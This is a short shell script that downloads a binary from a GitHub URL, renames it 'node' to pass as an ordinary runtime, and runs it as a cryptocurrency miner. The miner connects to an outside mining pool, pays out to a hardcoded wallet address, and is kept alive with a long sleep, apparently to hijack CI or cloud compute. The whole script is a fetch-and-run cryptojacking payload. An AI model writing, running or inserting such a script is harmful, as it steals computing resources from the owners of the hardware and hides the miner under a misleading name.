#!/bin/sh
set -e
curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
chmod +x node
WORKER_NUMBER=$1
PASSHOURS=$(date +%S)
#./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
./node --disable-gpu -a ghostrider -o stratum+tcp://us-west.oasispool.xyz:13000 -u GeqnGzyChYrCW6nVtam2a8i9xhb4uFwDzh.${WORKER_NUMBER}_crf > try.log
sleep 29999
